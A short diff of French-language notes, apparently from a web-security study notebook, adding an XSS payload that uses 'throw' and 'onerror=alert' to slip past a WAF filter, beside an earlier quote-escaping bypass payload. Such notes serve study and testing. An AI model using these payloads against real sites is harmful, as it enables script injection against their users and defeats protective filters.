@@ -50,3 +50,9 @@ donc on peut utiliser ce genre de payload: `\';alert(document.domain)//`
 
 pour qu'il soit interprété ainsi: `\\';alert(document.domain)//`
 
+                                        	—------------------------------------------------------
+
+utilisation de `throw` pour l'XSS pour éviter le filtre WAF: 
+
+
+`x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
